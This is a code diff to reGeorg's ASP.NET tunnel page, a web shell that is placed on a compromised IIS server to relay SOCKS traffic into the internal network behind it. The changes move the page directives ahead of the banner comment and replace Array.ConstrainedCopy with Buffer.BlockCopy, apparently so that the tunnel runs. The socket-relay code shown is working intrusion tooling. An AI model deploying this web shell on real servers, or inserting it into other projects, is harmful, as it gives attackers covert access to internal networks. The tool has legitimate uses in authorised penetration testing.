@@ -1,4 +1,8 @@
-﻿/*                   _____                                    
+﻿<%@ Page Language="C#" EnableSessionState="True"%>
+<%@ Import Namespace="System.Net" %>
+<%@ Import Namespace="System.Net.Sockets" %>
+<%
+/*                   _____                                    
   _____   ______  __|___  |__  ______  _____  _____   ______  
  |     | |   ___||   ___|    ||   ___|/     \|     | |   ___| 
  |     \ |   ___||   |  |    ||   ___||     ||     \ |   |  | 
@@ -23,10 +27,6 @@ to exist within your internal network.
 For more information, see:
 https://github.com/sensepost/reGeorg
 */
-<%@ Page Language="C#" EnableSessionState="True"%>
-<%@ Import Namespace="System.Net" %>
-<%@ Import Namespace="System.Net.Sockets" %>
-<%
     try
     {
         if (Request.HttpMethod == "POST")
@@ -98,7 +98,8 @@ https://github.com/sensepost/reGeorg
                         while ((c = s.Receive(readBuff)) > 0)
                         {
                             byte[] newBuff = new byte[c];
-                            Array.ConstrainedCopy(readBuff, 0, newBuff, 0, c);
+                            //Array.ConstrainedCopy(readBuff, 0, newBuff, 0, c);
+                            System.Buffer.BlockCopy(readBuff, 0, newBuff, 0, c);
                             Response.BinaryWrite(newBuff);
                         }
                         Response.AddHeader("X-STATUS", "OK");
